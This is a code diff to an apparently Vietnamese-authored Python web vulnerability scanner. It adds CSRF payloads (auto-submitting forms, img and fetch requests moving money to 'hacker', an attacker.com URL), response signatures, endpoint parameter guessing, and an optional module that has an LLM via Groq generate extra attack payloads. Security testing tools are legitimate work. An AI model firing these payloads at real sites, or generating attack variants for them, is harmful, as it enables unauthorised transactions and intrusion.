@@ -24,6 +24,7 @@ import logging
 from datetime import datetime
 from html.parser import HTMLParser
 from urllib.parse import urljoin, urlparse, urlencode
+from modul3_hacker_brain import HackerBrain
 try:
     from selenium import webdriver
     from selenium.webdriver.chrome.service import Service
@@ -133,6 +134,12 @@ ATTACK_PAYLOADS = {
         "http://0.0.0.0:8080",
         "http://[::1]:80",
     ],
+    "CSRF": [
+        "http://attacker.com/csrf/transfer",
+        "<form action='/transfer' method='POST' id='csrf'><input type='hidden' name='to' value='hack' /><input type='hidden' name='amount' value='9999' /></form><script>document.getElementById('csrf').submit();</script>",
+        "<img src='http://localhost:5170/transfer?to=hacker&amount=9000'>",
+        "<html><body><script>fetch('/transfer?to=hacker&amount=9999');</script></body></html>",
+    ],
 }
 
 # Dấu hiệu tấn công thành công trong response
@@ -167,8 +174,43 @@ VULN_SIGNATURES = {
         r"ami-id\s*:\s*ami-[a-f0-9]+",
         r"instance-id\s*:\s*i-[a-f0-9]+",
         r"local-ipv4\s*:\s*\d+\.\d+\.\d+",
+        r"SSH-2.0-OpenSSH",
+        r"mysql_native_password",
+        r"Kết quả fetch URL",
+    ],
+    "CSRF": [
+        r"Chuyển khoản thành công",
+        r"Invalid CSRF",
     ],
 }
+
+
+def _infer_endpoint_params(url, method, source_label):
+    """Suy luận endpoint params cho API không có query string.
+
+    Tránh bắn param giả vào trang non-API (ví dụ /about, /tuyensinh).
+    Returns list of endpoint dicts.
+    """
+    parsed_path = urlparse(url).path.rstrip('/')
+    last_seg = parsed_path.split('/')[-1] if parsed_path else ''
+    is_api = bool(re.search(r'/(?:api|v\d+)/', parsed_path))
+
+    results = []
+    if method in ('POST', 'PUT', 'PATCH'):
+        # POST/PUT thường nhận body → thử các param phổ biến
+        for pname in ['id', 'query', 'input', 'data']:
+            results.append({
+                'url': url, 'param': pname,
+                'method': method, 'source': f'{source_label}-body'
+            })
+    elif is_api or (last_seg and last_seg.isdigit()):
+        # GET trên API path hoặc path kết thúc bằng số → thử 'id'
+        results.append({
+            'url': url, 'param': 'id',
+            'method': method, 'source': f'{source_label}-path'
+        })
+    # else: bỏ qua — page thường không có query param để inject
+    return results
 
 
 # ===== AI ENGINE =====
@@ -219,8 +261,10 @@ class VulnerabilityScanner:
     Chủ động tấn công thử vào web mục tiêu, phân tích response.
     """
 
-    def __init__(self, target_url):
+    def __init__(self, target_url, ai_brain=False):
         self.target_url = target_url.rstrip('/')
+        self.ai_brain_enabled = ai_brain
+        self.hacker_brain = HackerBrain() if self.ai_brain_enabled else None
         self.ai = AIEngine()
         self.ai.load()
         self.session = requests.Session()
@@ -232,6 +276,7 @@ class VulnerabilityScanner:
         self.endpoints = []          # Các endpoint tìm được
         self.start_time = None
         self.end_time = None
+        self._attack_payloads = ATTACK_PAYLOADS  # Bản tham chiếu mặc định (không mutate)
 
     def banner(self):
         print(f"""
@@ -400,12 +445,9 @@ class VulnerabilityScanner:
                                         'source': 'network-query'
                                     })
                         else:
-                            endpoints.append({
-                                'url': req_url,
-                                'param': 'id',
-                                'method': method,
-                                'source': 'network-api'
-                            })
+                            # Suy luận param thông minh thay vì hard-code 'id'
+                            endpoints.extend(_infer_endpoint_params(
+                                req_url, method, 'network-api'))
             except Exception as e:
                 print(f"  {Color.YELLOW}⚠️  Performance log lỗi: {e}{Color.END}")
 
@@ -430,12 +472,9 @@ class VulnerabilityScanner:
                                     'source': 'captured-xhr'
                                 })
                     else:
-                        endpoints.append({
-                            'url': req_url,
-                            'param': 'id',
-                            'method': method,
-                            'source': 'captured-xhr'
-                        })
+                        # Suy luận param thông minh thay vì hard-code 'id'
+                        endpoints.extend(_infer_endpoint_params(
+                            req_url, method, 'captured-xhr'))
             except Exception as e:
                 print(f"  {Color.YELLOW}⚠️  Captured request log lỗi: {e}{Color.END}")
 
@@ -598,7 +637,7 @@ class VulnerabilityScanner:
             path = urlparse(ep['url']).path
             print(f"\n  {Color.BOLD}── Tấn công: {ep['method']} {path}?{ep['param']}=... ──{Color.END}")
 
-            for attack_type, payloads in ATTACK_PAYLOADS.items():
+            for attack_type, payloads in self._attack_payloads.items():
                 for payload in payloads:
                     total_tests += 1
                     result = self.attack_endpoint(ep, attack_type, payload)
@@ -808,6 +847,21 @@ class VulnerabilityScanner:
         self.banner()
         self.start_time = time.time()
 
+        # Phase 0: AI Brain (Llama via Groq)
+        if self.ai_brain_enabled:
+            import copy
+            print(f"\n{Color.MAGENTA}[Phase 0] 🧠 Brain: Generating AI payloads via Groq...{Color.END}")
+            # Deep copy để KHÔNG mutate global ATTACK_PAYLOADS
+            self._attack_payloads = copy.deepcopy(ATTACK_PAYLOADS)
+            for attack_type in self._attack_payloads.keys():
+                print(f"  [*] Thinking of {attack_type} variations...", end="", flush=True)
+                ai_payloads = self.hacker_brain.generate_creative_payloads(attack_type, count=5)
+                if ai_payloads:
+                    self._attack_payloads[attack_type].extend(ai_payloads)
+                    print(f" Done (+{len(ai_payloads)})")
+                else:
+                    print(" Skipped")
+
         # Phase 1: Crawl
         if not self.crawl_target():
             print(f"\n{Color.RED}❌ Không tìm được endpoint nào. Dừng scan.{Color.END}")
@@ -881,7 +935,7 @@ def create_api_server():
 
             # Phase 2: Attack
             for ep in scanner.endpoints:
-                for attack_type, payloads in ATTACK_PAYLOADS.items():
+                for attack_type, payloads in ATTACK_PAYLOADS.items():  # API mode: scanner mới mỗi request, không cần copy
                     for payload in payloads:
                         scanner.attack_endpoint(ep, attack_type, payload)
 
@@ -987,11 +1041,15 @@ if __name__ == '__main__':
         default=5001,
         help='Port cho Web Server (mặc định: 5001)'
     )
-    # Thêm flag chạy liên tục
     parser.add_argument(
         '--loop', '-l',
         action='store_true',
         help='Chế độ giám sát liên tục (quét lặp lại sau mỗi khoảng nghỉ)'
+    )
+    parser.add_argument(
+        '--ai-brain', '-a',
+        action='store_true',
+        help='Kích hoạt AI Brain (Groq) để sinh thêm payload sáng tạo'
     )
     args = parser.parse_args()
 
@@ -1014,7 +1072,7 @@ if __name__ == '__main__':
             print(f"{Color.GREEN} BẮT ĐẦU CHẾ ĐỘ GIÁM SÁT LIÊN TỤC TRÊN: {target}{Color.END}")
             print(f"{Color.YELLOW}Nhấn Ctrl+C để dừng hệ thống.{Color.END}\n")
             try:
-                scanner = VulnerabilityScanner(target)
+                scanner = VulnerabilityScanner(target, ai_brain=args.ai_brain)
                 while True:
                     scanner.run(save_report=args.report)
                     print(f"\n{Color.BLUE} Hoàn tất chu kỳ quét. Nghỉ 60 giây trước khi quét lại...{Color.END}")
@@ -1023,7 +1081,7 @@ if __name__ == '__main__':
                 print(f"\n{Color.RED} Đã dừng giám sát.{Color.END}")
         else:
             # KỊCH BẢN QUÉT 1 LẦN RỒI HỎI (Như cũ nhưng gọn hơn)
-            scanner = VulnerabilityScanner(target)
+            scanner = VulnerabilityScanner(target, ai_brain=args.ai_brain)
             while True:
                 scanner.run(save_report=args.report)
                 print(f"\n{Color.YELLOW} Bạn có muốn quét lại hoặc thử URL khác không? (y/n): {Color.END}", end="")
